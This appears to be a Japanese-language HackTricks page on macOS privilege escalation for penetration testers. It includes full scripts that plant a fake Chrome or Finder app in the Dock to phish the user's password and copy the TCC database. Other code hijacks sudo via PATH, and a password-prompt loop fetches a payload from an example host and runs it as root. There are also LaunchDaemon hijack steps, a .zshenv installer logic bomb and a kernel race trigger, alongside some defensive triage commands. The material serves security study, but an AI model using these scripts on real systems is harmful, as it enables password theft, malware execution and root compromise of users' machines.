# macOS 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## TCC 権限昇格

TCC の権限昇格について調べている場合は、こちらを参照してください。


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux 権限昇格

Linux やその他の Unix 系システムに影響する多くの権限昇格テクニックは、macOS にも適用できます。こちらを参照してください。


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## ユーザー操作

### Sudo Hijacking

元の [Sudo Hijacking テクニックは Linux Privilege Escalation の記事](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)にあります。

ただし、macOS はユーザーが **`sudo`** を実行するときも、ユーザーの **`PATH`** を**維持します**。そのため、この攻撃を実現する別の方法として、被害者が **sudo の実行時に実行する他のバイナリを乗っ取る**ことができます。

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

ターミナルを使うユーザーは**Homebrewをインストールしている可能性が非常に高い**ことに注意してください。そのため、**`/opt/homebrew/bin`**内のバイナリを乗っ取ることができます。

### Dockの偽装

**ソーシャルエンジニアリング**を使って、たとえばDock内で**Google Chromeになりすまし**、実際には自分のスクリプトを実行できます。

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案:

- DockにChromeがあるか確認し、ある場合はその項目を**削除**して、Dock配列内の**同じ位置に****偽の**Chrome項目を**追加**します。

<details>
<summary>ChromeのDock偽装スクリプト</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案:

- **Dock から Finder を削除することはできない**ため、Dock に追加するなら、偽の Finder を本物のすぐ隣に配置できます。そのためには、**偽の Finder の項目を Dock 配列の先頭に追加する必要があります**。
- もう1つの方法は、Dock に配置せず、そのまま開くことです。「Finder が Finder の制御を求めています」と表示されても、それほど不自然ではありません。
- もう1つの方法として、パスワードを求めずに**root に昇格する**ため、ひどいダイアログを表示する代わりに、Finder に特権操作を実行するためのパスワードを実際に求めさせることもできます:
  - Finder に **`/etc/pam.d`** へ新しい **`sudo`** ファイルをコピーさせます（パスワードを求めるプロンプトには「Finder が sudo のコピーを求めています」と表示されます）。
  - Finder に新しい **Authorization Plugin** をコピーさせます（ファイル名を指定すれば、パスワードを求めるプロンプトに「Finder が Finder.bundle のコピーを求めています」と表示できます）。

<details>
<summary>Finder Dock 偽装スクリプト</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### パスワードプロンプト phishing + sudo の再利用

Malwareは、ユーザーとのやり取りを悪用して**sudoを実行できるパスワードを取得**し、プログラムから再利用することがよくあります。一般的な流れ:

1. `whoami` でログイン中のユーザーを特定する。
2. `dscl . -authonly "$user" "$pw"` が成功を返すまで、**パスワードプロンプトをループする**。
3. 認証情報をキャッシュし（例: `/tmp/.pass`）、`sudo -S`（標準入力経由でパスワードを渡す）で特権操作を実行する。

最小限の実行例:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

盗まれたパスワードは、**`xattr -c`でGatekeeperのquarantineを解除**したり、LaunchDaemonsやその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりするために再利用できます。<sup>[[1]](#references)</sup>

## 新しいmacOS固有の攻撃ベクトル（2023–2026）

### 非推奨の`AuthorizationExecuteWithPrivileges`は現在も使用可能

`AuthorizationExecuteWithPrivileges`は10.7で非推奨になりましたが、**Sonoma/Sequoiaでも引き続き動作します**。多くの商用アップデーターは、信頼できないパスを指定して`/usr/libexec/security_authtrampoline`を呼び出します。対象バイナリがユーザーによる書き込み可能であれば、トロイの木馬を仕込み、正規のプロンプトを利用できます:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

**上記のなりすまし手法**と組み合わせて、もっともらしいパスワードダイアログを表示します。


### Privileged helper / XPC のトリアージ

最新のサードパーティ製 macOS privesc の多くは、同じパターンに従います。**root の LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後、helper が **クライアントを検証しない**、検証が **遅すぎる**（PID race）、または **ユーザーが制御できるパスやスクリプト**を処理する **root メソッド**を公開します。これは、VPN クライアント、ゲームランチャー、アップデーターで近年多く発見されている helper の脆弱性の原因となるバグクラスです。<sup>[[2]](#references)</sup>

簡単なトリアージ用チェックリスト:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

特に、次のような helper に注意してください。

- `launchd` にジョブが読み込まれたままになっているため、**アンインストール後も**リクエストを受け付け続ける
- **`/Applications/...`** や、root 以外のユーザーが書き込み可能なその他のパスからスクリプトを実行したり、設定を読み込んだりする
- race 可能な **PID ベース**または **bundle-id のみ**による peer 検証に依存している

helper の認可バグについて詳しくは、[こちらのページ](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)を確認してください。

### PackageKit script environment inheritance (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、ユーザーが **`Installer.app`** / **`PackageKit.framework`** 経由でインストールを開始すると、PKG スクリプトが現在のユーザーの環境内で root として実行される可能性がありました。つまり、**`#!/bin/zsh`** を使うパッケージを被害者がインストールすると、攻撃者の **`~/.zshenv`** が読み込まれ、root として実行されるということです。<sup>[[3]](#references)</sup>

これは **logic bomb** として特に興味深い攻撃です。ユーザーアカウントへの foothold と、書き込み可能なシェル起動ファイルさえあれば、脆弱な **zsh ベース**のインストーラーがユーザーによって実行されるのを待つだけです。これは通常、**MDM/Munki** によるデプロイには当てはまりません。これらは root ユーザーの環境内で実行されるためです。<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

インストーラ固有の悪用について詳しく知りたい場合は、[こちらのページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も確認してください。

### `.localized` を利用したインストール先の衝突

一部のサードパーティ製インストーラは、実行ファイルが `/Applications/Target.app` 内の固定パスで参照される root LaunchDaemon を登録します。攻撃者が先に**異なる bundle identifier** を使ってそのバンドルを作成できる場合、Installer は偽装バンドルを残し、本物のアプリを `/Applications/Target.localized/Target.app` に配置することがあります。Daemon は引き続き元のパスを参照します。そのため、偽装バンドル内の攻撃者が制御する実行ファイルが、後から root 権限で実行される可能性があります。<sup>[[8]](#references)</sup>

重要な前提条件は次のとおりです。<sup>[[8]](#references)</sup>

1. 攻撃者が想定されるアプリケーションパスを作成または制御できる。
2. パッケージが競合するバンドルを削除しない。
3. 特権ジョブが、そのバンドル内のハードコードされたパスを使用する。
4. ユーザーまたは MDM ワークフローがパッケージをインストールし、ジョブを登録する。

移動されたバンドルを探し、次のセクションの列挙ループを使って LaunchDaemon の参照先を確認してください。<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

より安全なインストーラーは、最終的なバンドルの場所を解決し、特権実行ファイルを `/Library/PrivilegedHelperTools` などの root 所有の場所に保持します。また、ジョブを登録または起動する前に、所有者とコード署名を検証する必要があります。<sup>[[8]](#references)</sup>

### 書き込み可能な LaunchDaemon ターゲットの hijack

LaunchDaemon の plist が root 所有でも、その `Program` または `ProgramArguments` の最初のエントリーがユーザーによる書き込みが可能なディレクトリを指している場合があります。実行ファイルのモードだけでなく、**パス全体**を確認してください。親ディレクトリが書き込み可能な場合、攻撃者は root 所有の実行ファイルの名前を変更し、同じパスに置き換えファイルを作成できる可能性があります。次回ジョブが起動すると、置き換えファイルが root として実行されます。再起動または通常のサービス再起動で十分です。攻撃者がシステムドメインで `launchctl bootstrap` を実行する権限を持つ必要はありません。<sup>[[7]](#references)</sup>

まず各ターゲットと、その直近の親ディレクトリを列挙します。<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

ファイルまたはその親ディレクトリが書き込み可能な場合は、元のバイナリを退避し、そのパスに実行可能なpayloadを配置します。その後、すでに読み込まれているdaemonが再起動するのを待ちます。<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR credential-pointer race (CVE-2025-24118)

脆弱な `kauth_cred_proc_update` の処理経路では、SMR reader がロックなしでポインターを読み込む一方、非アトミックな `zalloc_ro_mut` API を使って `proc_ro.p_ucred` を更新していました。公開されているトリガーでは、特別に準備した setgid バイナリを使用します。一方のスレッドが実グループ ID と実効グループ ID を切り替え、もう一方のスレッドが `getgid()` などのシステムコールを繰り返し実行します。<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

これを既製のroot exploitではなく、**race primitive**として扱ってください。公開されたPoCが示しているのは、credential pointerのtornです。多くの場合、kernel panicで終わります。研究者がこの破損を再現したのはIntelのみで、結果として生じるcredential objectを決定論的に制御する方法は示していません。AppleはmacOS 15.3で更新処理をatomic pointer exchangeに変更しました。<sup>[[4]](#references)</sup>

### Migration AssistantによるSIP bypass（「Migraine」、CVE-2023-32369）

すでにrootを取得していても、SIPによってシステム領域への書き込みはブロックされます。**Migraine** bugは、Migration Assistantのentitlement `com.apple.rootless.install.heritable`を悪用して、SIP bypassを継承するchild processを起動し、保護されたパス（例：`/System/Library/LaunchDaemons`）を上書きします。<sup>[[5]](#references)</sup> 攻撃の流れ：

1. 稼働中のシステムでrootを取得する。
2. 細工したstateで`systemmigrationd`を起動し、攻撃者が制御するbinaryを実行させる。
3. 継承したentitlementを使ってSIPで保護されたファイルにパッチを適用し、再起動後も永続化させる。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531のbug class）

複数のApple daemonはXPC経由で**NSPredicate** objectを受け付けますが、検証するのは攻撃者が制御可能な`expressionType` fieldのみです。任意のselectorを評価するpredicateを作成することで、**root/system XPC service（例：`coreduetd`、`contextstored`）でcode execution**を実現できます。初期のapp sandbox escapeと組み合わせると、**ユーザーへの確認なしでprivilege escalation**が可能になります。predicateをdeserializeする一方で、堅牢なvisitorを備えていないXPC endpointを探してください。<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypassとprivilege escalation

**どのユーザーでも**（権限のないユーザーも含む）、`-o noowners`を指定してTime Machine snapshotを作成・mountし、そのsnapshot内の**すべてのファイルにアクセス**できます。これにより、稼働中のvolumeに対するownership checkを回避できます。必要な権限は、使用するアプリ（`Terminal`など）が**Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）を持つことだけです。

コマンドと詳しい説明は、TCC bypassesのページにあります：

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

以下はprivilege escalationに役立つ場合があります：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025年はInfostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS向けAWS Client VPNのLocal Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKitのPrivilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft「Migraine」SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOSおよびiOSにおける新たなPrivilege Escalation Bug Class（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: 安全でないフォルダー権限を利用したprivilege escalationとpersistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [`.localized` directoryを介したmacOS LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
